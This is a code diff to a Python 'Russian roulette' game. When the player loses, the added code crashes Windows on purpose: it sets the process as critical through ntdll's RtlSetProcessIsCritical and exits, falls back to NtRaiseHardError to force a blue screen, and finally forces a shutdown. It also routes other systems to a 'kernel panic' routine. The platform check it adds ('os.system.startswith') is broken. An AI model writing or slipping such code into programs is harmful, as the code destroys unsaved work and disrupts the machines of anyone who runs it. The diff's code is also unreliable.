@@ -4,7 +4,36 @@ import platform
 import random
 import sys
 
-def show_linux_bsod():
+
+#Windows BSoD code
+def is_windows_admin():
+    if sys.platform.startswith('win'):
+        try:
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except Exception:
+            return False
+    return False
+
+def trigger_windows_bsod():
+    import ctypes
+    
+    try:
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
+    except Exception:
+        pass
+    try:
+        ctypes.windll.ntdll.RtlSetProcessIsCritical(True, None, False)
+        sys.exit(1)
+    except Exception:
+        try:
+            res = ctypes.c_ulong()
+            ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, None, 6, ctypes.byref(res))
+            sys.exit(1)
+        except Exception:
+            os.system("shutdown /s /t 0")
+
+def trigger_kernel_panic():
     try:
         import tkinter as tk
         import qrcode
@@ -85,7 +114,10 @@ def start_game():
         if attempt == bullet_slot:
             print("YOUR PC IS DEAD AXAXAXAXAXAXAXXAX\n")
             time.sleep(1)
-            trigger_terminal_chaos()
+            if os.system.startswith('win'):
+                trigger_windows_bsod()
+            else:    
+                trigger_kernel_panic()
             return
         else:
             if attempt < 6:
